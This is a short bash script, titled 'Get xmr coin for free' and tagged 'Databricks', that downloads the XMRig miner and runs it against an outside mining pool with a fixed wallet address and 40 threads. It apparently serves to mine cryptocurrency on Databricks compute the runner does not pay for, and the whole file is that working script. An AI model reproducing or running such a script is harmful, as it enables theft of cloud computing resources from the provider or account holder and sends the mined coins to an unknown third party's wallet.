#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -a ghostrider --url stratum-asia.rplant.xyz:17056 --tls --user RGFK2FayQdaNxD12SQu1X1pTWM43KGjSLF.devtd --threads=40
